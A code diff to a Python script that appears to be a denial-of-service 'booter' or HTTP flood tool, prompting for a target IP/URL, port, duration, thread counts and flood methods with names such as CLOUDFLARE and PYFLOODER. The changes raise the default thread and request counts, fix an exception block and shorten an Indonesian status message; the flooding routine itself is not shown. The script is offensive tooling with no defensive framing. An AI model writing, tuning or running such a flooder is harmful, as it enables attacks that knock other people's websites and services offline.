@@ -102,21 +102,18 @@ ip = ""
 target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
 port_loader = int(input(f"{Fore.YELLOW}PORT>"))
 time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME (DEFAULT=250)>"))
-spam_loader = int(input(f"{Fore.RED}SPAM THREAD (DEFAULT=50 OR 200)>"))
+spam_loader = int(input(f"{Fore.RED}SPAM THREAD (DEFAULT=50 OR 299)>"))
 create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=50)>"))
-booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=300)>"))
-
-print(f"{Fore.LIGHTCYAN_EX} pilih methhods> GET POST HEAD ")
+booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500)>"))
+print(f"{Fore.LIGHTCYAN_EX}EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD ")
+print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
+methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
 print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
 try:
     host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
     ip = socket.gethostbyname(host)
 except socket.gaierror:
-    
-METHODS_LOADER= INPUT(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
-    
-    print(f"{Fore.CYAN}CUSTOM HTTP METHODS> SERVER CLOUDFLARE PYFLOODER GATEWAY")
-exit()
+    exit()
 for loader_num in range(create_thread):
     sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
     sys.stdout.flush()
@@ -128,4 +125,4 @@ for loader_num in range(create_thread):
 clear_text()
 print(banner)
 status_code = True
-print(f"{Fore.GREEN}TRYING SENT ..... KIRIMAN ANDA TELAH DITERIMA DENGAN MESRA...!!{Fore.RESET}")        
+print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
